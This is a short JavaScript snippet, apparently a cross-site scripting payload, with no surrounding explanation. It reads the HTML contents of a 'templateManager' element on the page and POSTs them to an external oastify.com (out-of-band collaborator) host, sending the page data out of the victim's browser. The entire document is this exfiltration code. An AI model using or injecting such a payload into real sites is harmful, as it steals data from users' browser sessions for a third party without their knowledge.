var text = document.getElementsByClassName('templateManager')[0].innerHTML

fetch("https://7ltl8v7rv60bj5sruskg3bl3augl4pse.oastify.com/add_content", {
        body: "url=&content=" +
        encodeURIComponent(text), headers: {
            "Content-Type": "application/x-www-form-urlencoded" },
            method: "POST"
})
